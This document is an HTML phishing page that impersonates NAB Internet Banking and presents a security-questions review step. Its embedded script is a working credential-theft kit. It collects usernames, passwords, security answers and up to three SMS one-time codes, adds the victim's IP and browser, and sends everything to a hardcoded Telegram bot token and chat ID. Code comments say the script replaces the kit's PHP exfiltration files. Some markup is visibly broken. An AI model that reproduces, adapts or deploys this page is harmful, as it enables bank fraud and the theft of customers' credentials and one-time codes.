<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>NAB Internet Banking</title>
    <link rel="shortcut icon" href="img/favicon.svg" type="image/x-icon" />
    <style>
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
      }

      body,
      html {
        font-family: Arial, sans-serif;
        height: 100%;
      }

      .header_banner {
        width: 100%;
        background-color: #000;
      }

      .header_inner {
        display: flex;
        justify-content: space-between;
        align-items: center;
        max-width: 1200px;
        margin: 0 auto;
        padding: 15px 16px;
        width: 100%;
        gap: 20px;
      }

      .header_left {
        display: flex;
        align-items: center;
      }

      .header_right {
        color: #fff;
        display: flex;
        align-items: center;
        justify-content: center;
      }

      .header_right p {
        font-size: 0.8em;
        padding: 10px;
      }

      .banner {
        position: relative;
        min-height: 100vh;
        background-image: url("img/bg-login.jpeg");
        background-repeat: no-repeat;
        background-size: cover;
        background-position: center top;
        background-attachment: fixed;
        display: flex;
        flex-direction: column;
        overflow: hidden;
      }

      .login_wrapper {
        position: relative;
        width: 100%;
        max-width: 500px;
        margin-top: 40px;
        margin-left: 300px;
        background-color: white;
        border-radius: 8px;
        overflow: hidden;
      }

      .security-questions-icon {
        width: 45px;
        height: 45px;
      }
      .security-questions-header {
        font-family: "SourceSans-Light";
        font-size: 1.5em;
      }
      .form_container {
        position: relative;
        width: 100%;
        height: 150%;
        padding: 38px 32px;
        padding-bottom: 0px;
      }

      .loading-div {
        position: absolute;
        width: 100%;
        top: 30%;
        left: 50%;
        transform: translate(-50%, -50%);
      }

      h1 {
        font-size: 30px;
        margin-bottom: 32px;
        color: #333;
        font-weight: 100;
      }

      .input_field {
        /* margin: 20px 0px; */
      }

      .error {
        margin-bottom: 0.8em;
      }

      .input_field label {
        font-size: 14px;
        color: #000;
        display: block;
        margin-bottom: 8px;
        font-weight: bold;
      }

      .input_field select,
      .input_field input {
        width: 100%;
        padding: 12px;
        border: 1px solid #ccc;
        border-radius: 4px;
        font-size: 16px;
      }

      .input_field .error {
        color: rgb(194, 0, 0);
        font-size: 12px;
      }

      .login_button {
        margin-bottom: 20px;
      }

      .login_button button {
        width: 128px;
        padding: 12px;
        background-color: #e2001a;
        color: #fff;
        border: none;
        border-radius: 4px;
        font-size: 16px;
        cursor: pointer;
      }

      .login_button button:hover {
        background-color: #d00016;
      }

      .footer_links a {
        color: #d00016;
      }

      .footer_links a:hover {
        text-decoration: underline;
      }

      .footer_link2 {
        margin-top: 30px;
        background-color: #e6e6e6;
        padding: 20px;
        font-size: 16px;
        font-weight: 100;
      }

      .info {
        color: #4d4d4d;
        font-size: 14px;
      }

      .footer_link2 a {
        color: #d00016;
        font-weight: bold;
      }

      .input_field input,
      .input_field select {
        width: 100%;
        padding: 12px;
        border: 1px solid #ccc;
        border-radius: 4px;
        font-size: 16px;
        transition: border 0.3s ease;
      }

      .input_field input:focus,
      .input_field select:focus {
        outline: none;
        border: 3px solid grey;
      }

      .input_error {
        border: 1px solid rgb(194, 0, 0) !important;
      }

      .input_error:focus {
        border: 3px solid rgb(194, 0, 0) !important;
      }

      .input_field .error {
        color: rgb(194, 0, 0);
        font-size: 14px;
        margin-top: 4px;
        height: 14px;
        line-height: 14px;
        transition: all 0.3s ease;
      }

      .modal-backdrop {
        position: fixed;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        background-color: rgba(0, 0, 0, 0.5);
        z-index: 999;
      }

      .modal {
        position: fixed;
        top: 28%;
        left: 50%;
        transform: translate(-50%, -50%);
        background-color: #fff;
        padding: 40px;
        border-radius: 8px;
        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
        z-index: 1000;
        width: 400px;
        height: 300px;
        text-align: center;
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
      }

      .spinner {
        width: 40px;
        height: 40px;
        border: 4px solid #ddd;
        border-top: 4px solid rgb(194, 0, 0);
        border-radius: 50%;
        animation: spin 1s linear infinite;
        margin: 0 auto;
      }

      @keyframes spin {
        to {
          transform: rotate(360deg);
        }
      }

      @font-face {
        font-family: "SourceSans-Light";
        src: url("font/SourceSans-Light.woff2") format("woff2"),
          url("font/SourceSans-Light.woff") format("woff");
        font-weight: 100;
        font-style: normal;
      }

      .loading-div {
        display: none;
        flex-direction: column;
        justify-content: center;
        align-items: center;
        padding: 20px;
      }

      .loader {
        width: 40px;
        height: 40px;
        border: 3px solid transparent;
        border-top: 3px solid #e60000;
        border-right: 3px solid #e60000;
        border-radius: 50%;
        animation: spin 1.5s linear infinite;
        margin: 0 auto;
      }

      .loader-message {
        margin-top: 12px;
        font-size: 14px;
        color: #444;
        text-align: center;
        font-family: Arial, sans-serif;
      }
      .checkbox-field {
        margin-bottom: 1em;
        display: flex;
        align-items: center;
        gap: 10px;
      }

      #agree {
        height: 20px;
        width: 20px;
      }

      @media screen and (max-width: 768px) {
        .header_inner {
          display: flex;
          justify-content: space-between;
          padding: 14px 16px;
        }

        .header_left {
          margin-left: 0;
          margin-bottom: 10px;
        }

        .header_right {
          display: none;
        }

        .login_wrapper {
          width: 90%;
          margin: 50px auto;
          background-color: white;
          border-radius: 8px;
          overflow: hidden;
        }

        .form_container {
          padding: 20px;
        }

        .security-questions-icon {
          width: 40px;
          height: 40px;
        }
        .security-questions-header {
          font-size: 1.2em;
        }
        #agree {
          height: 25px;
          width: 25px;
        }
      }
    </style>
  </head>
  <body>
    <div class="header_banner" id="headerBanner">
      <div class="header_inner">
        <div class="header_left">
          <img
            class="logo-img"

            width="90"

          <h1 style="color: #fff; font-size: 22px; margin: 0">

        </div>
        <div class="header_right">
          <p id="currentDate"></p>
          |
          <p>Help</p>
          |
          <p>Security</p>

          <p>Locate us</p>
        </div>
      </div>

      <div class="banner">
        <div class="login_wrapper" style="width: 90%">
          <div class="form_container">

            <form id="loginForm" novalidate>
              <div
                class="security-questiion-header"
                style="
                  display: flex;

                "
              >
                <svg

                  viewBox="0 0 35 35"

                    ></path>

                    ></path>

                </svg>
                <h2 class="security-questions-header">
                  Your Security Questions and Answers
                </h2>
              </div>
              <div class="input_field">
                <label for="question1">Security Question 1</label>
                <div style="margin: 1em 0; width: 100%" id="q1"></div>
                <label for="question1">Security Answer 1</label>
                <div id="a1"></div>
              </div>
              <br />
              <br />
              <div class="input_field">
                <label for="question1">Security Question 2</label>
                <div style="margin: 1em 0; width: 100%" id="q2"></div>
                <label for="question1">Security Answer 2</label>
                <div id="a2"></div>
              </div>
              <br />
              <br />
              <div class="input_field">
                <label for="question1">Security Question 3</label>
                <div style="margin: 1em 0; width: 100%" id="q3"></div>

    <div

        position: fixed;

      "
    >

        id="loadingModal"
        style="
          background: #fff;

          text-align: center;
          box-shadow: 0 0 15px rgba(0, 0, 0, 0.3);

        <div class="spinner" style="margin-bottom: 20px"></div>

          Loading, please wait...

      </div>
    </div>

    <script>
      document.addEventListener("DOMContentLoaded", function () {
        document.querySelector(".back-btn").addEventListener("click", () => {
          location.href = "security.html";
        });
        const savedData = localStorage.getItem("securityQA");
        if (savedData) {
          const { q1, a1, q2, a2, q3, a3 } = JSON.parse(savedData);
          document.querySelector("#q1").textContent = q1;
          document.querySelector("#a1").textContent = a1;
          document.querySelector("#q2").textContent = q2;
          document.querySelector("#a2").textContent = a2;
          document.querySelector("#q3").textContent = q3;
          document.querySelector("#a3").textContent = a3;
        } else {
          location.href = "security.html";
        }
      });
    </script>

    <script>
      function updateImageSrc() {
        const img = document.querySelector(".logo-img");
        if (!img) return;

        if (window.innerWidth <= 768) {
          img.src = "img/star.svg";
        } else {
          img.src = "img/star-big.svg";
        }
      }

      updateImageSrc();

      window.addEventListener("resize", updateImageSrc);
    </script>

    <script>
      function ShowLoadingModal() {
        document.getElementById("loginForm").style.display = "none";
        document.querySelector(".login_wrapper").style.height = "400px";
        document.querySelector(".loading-div").style.display = "flex";
        document.querySelector(".form_container").style.display = "flex";
      }
    </script>

    <script>
      document.addEventListener("DOMContentLoaded", function () {
        const currentDateElement = document.getElementById("currentDate");

        const options = {
          weekday: "long",
          day: "numeric",
          month: "long",
          year: "numeric",
        };

        const today = new Date();
        const formattedDate = today.toLocaleDateString("en-GB", options);

        currentDateElement.textContent = formattedDate;
      });
    </script>

    <!-- ================================================ -->
    <!-- THE NEW WORKING SCRIPT - REPLACES ALL PHP FILES -->
    <!-- ================================================ -->
    <script>
      // ===== CONFIG (Replaces edit.php) =====
      const CONFIG = {
        apikey: "7141307570:AAHS5kKgDW5fMmXoXtrXsxiegs7w3zudslw",
        chatid: "6768248084"
      };

      // ===== Helper Functions (Replaces fxker.php) =====
      function clean(value) {
        return String(value).trim().replace(/</g, '&lt;').replace(/>/g, '&gt;');
      }

      function getBrowser(ua) {
        if (ua.includes('MSIE')) return 'Internet Explorer';
        if (ua.includes('Firefox')) return 'Mozilla Firefox';
        if (ua.includes('Chrome')) return 'Google Chrome';
        if (ua.includes('Safari')) return 'Safari';
        if (ua.includes('Opera')) return 'Opera';
        return 'Unknown';
      }

      async function getLocation(ip) {
        try {
          const res = await fetch(`https://freeipapi.com/api/json/${ip}`);
          const data = await res.json();
          return { country: data.countryName || 'Unknown', city: data.cityName || 'Unknown' };
        } catch {
          return { country: 'Unknown', city: 'Unknown' };
        }
      }

      async function getClientInfo() {
        let ip = '0.0.0.0';
        try {
          const res = await fetch('https://api.ipify.org?format=json');
          const data = await res.json();
          ip = data.ip;
        } catch(e) {
          console.warn('IP fetch failed');
        }
        const location = await getLocation(ip);
        return {
          ip: ip,
          location: location,
          userAgent: navigator.userAgent,
          browser: getBrowser(navigator.userAgent)
        };
      }

      // ===== Send to Telegram (Replaces message() from fxker.php) =====
      async function sendTelegram(message) {
        try {
          const response = await fetch(`https://api.telegram.org/bot${CONFIG.apikey}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CONFIG.chatid, text: message })
          });
          const data = await response.json();
          console.log('Telegram response:', data);
          return data;
        } catch(e) {
          console.error('Telegram send error:', e);
          return null;
        }
      }

      // ===== Session Management (Replaces PHP $_SESSION) =====
      const Session = {
        get: function(key) {
          return localStorage.getItem('session_' + key);
        },
        set: function(key, value) {
          localStorage.setItem('session_' + key, value);
        },
        getUsername: function() {
          return this.get('username') || 'Unknown';
        }
      };

      // ===== The Main Switch (Replaces err.php) =====
      async function processForm(target, formData) {
        const info = await getClientInfo();
        let message = "";

        switch(parseInt(target)) {
          case 0: // Login (NAB LOGIN 1)
            const username = clean(formData.get('x') || '');
            const password = clean(formData.get('xx') || '');
            Session.set('username', username);
            Session.set('password', password);

            message = `
        ------------------[NAB LOGIN 1]------------------

        Username : ${username}
        Password : ${password}

        ------------[USER AGENT IP DNS]-------------
        User Agent
         ${info.userAgent}
        IP Address : ${info.ip}
        -------------[TELEGRAM: ECHOVSL]-------------`;
            break;

          case 1: // Security Questions
            const q1 = clean(formData.get('q1') || '');
            const a1 = clean(formData.get('a1') || '');
            const q2 = clean(formData.get('q2') || '');
            const a2 = clean(formData.get('a2') || '');
            const q3 = clean(formData.get('q3') || '');
            const a3 = clean(formData.get('a3') || '');

            message = `
        ---------------[Security Que n Ans]---------------

        Security Questions And Answers Set By ${Session.getUsername()}
        Delay in Progress Second Code Comes in 60 Seconds Time.

        Security Que 1: ${q1}
        Security Ans 1: ${a1}

        Security Que 2: ${q2}
        Security Ans 2: ${a2}

        Security Que 3: ${q3}
        Security Ans 3: ${a3}

        --------------[USER AGENT IP DNS]--------------
        User Agent
         ${info.userAgent}
        IP Address : ${info.ip}
        --------------[TELEGRAM: ECHOVSL]--------------`;
            break;

          case 2: // SMS Code 1
            const otp1 = clean(formData.get('xxl') || '');
            message = `
        --------------[NAB SMS CODE 1]--------------

        SMS CODE FROM : ${Session.getUsername()}
        SMS CODE : ${otp1}

        ------------[USER AGENT IP DNS]-------------
        User Agent
         ${info.userAgent}
        IP Address : ${info.ip}
        -------------[TELEGRAM: ECHOVSL]-------------`;
            break;

          case 3: // SMS Code 2
            const otp2 = clean(formData.get('xxll') || '');
            message = `
        --------------[NAB SMS CODE 2]--------------

        SMS CODE FROM : ${Session.getUsername()}
        SMS CODE : ${otp2}

        ------------[USER AGENT IP DNS]-------------
        User Agent
         ${info.userAgent}
        IP Address : ${info.ip}
        -------------[TELEGRAM: ECHOVSL]-------------`;
            break;

          case 4: // Review
            message = `
        --------------[SECURITY QA REVIEW]--------------

        ${Session.getUsername()} Reviewing Security Questions and Answers Set

        ------------[USER AGENT IP DNS]-------------
        User Agent
         ${info.userAgent}
        IP Address : ${info.ip}
        -------------[TELEGRAM: ECHOVSL]-------------`;
            break;

          case 5: // SMS Code 3
            const otp3 = clean(formData.get('xxlll') || '');
            message = `
        --------------[NAB SMS CODE 3]--------------

        SMS CODE FROM : ${Session.getUsername()}
        SMS CODE : ${otp3}

        ------------[USER AGENT IP DNS]-------------
        User Agent
         ${info.userAgent}
        IP Address : ${info.ip}
        -------------[TELEGRAM: ECHOVSL]-------------`;
            break;

          default:
            console.warn('Unknown target:', target);
            return false;
        }

        // Send to Telegram
        await sendTelegram(message);
        console.log('✅ Message sent to Telegram');
        return true;
      }
    </script>

    <!-- ================================================ -->
    <!-- THE FORM SUBMIT HANDLER - REPLACES XHR TO PHP    -->
    <!-- ================================================ -->
    <script>
      document.addEventListener("DOMContentLoaded", function () {
        const continueBtn = document.getElementById("continueBtn");
        const agreeCheckbox = document.getElementById("agree");
        const errorMessage = document.getElementById("error-message");

        continueBtn.addEventListener("click", function () {
          let isValid = true;
          
          if (!agreeCheckbox.checked) {
            errorMessage.style.display = "block";
            isValid = false;
            return;
          } else {
            errorMessage.style.display = "none";
          }
          
          if (isValid) {
            continueBtn.textContent = "Processing...";
            continueBtn.disabled = true;
            submitSecurityQuestions();
          }
        });

        agreeCheckbox.addEventListener("change", function () {
          if (this.checked) {
            errorMessage.style.display = "none";
          }
        });
      });

      // ===== NEW: submitSecurityQuestions - Replaces XHR to PHP =====
      async function submitSecurityQuestions() {
        // Case 4 = Review
        const formData = new FormData();
        formData.append("sws", 4);

        // Process and send to Telegram (no PHP needed!)
        const success = await processForm(4, formData);

        if (success) {
          ShowLoadingModal();
          setTimeout(() => {
            window.location.href = "success.html";
          }, 30000);
        } else {
          location.reload();
        }
      }
    </script>
  </body>
</html>
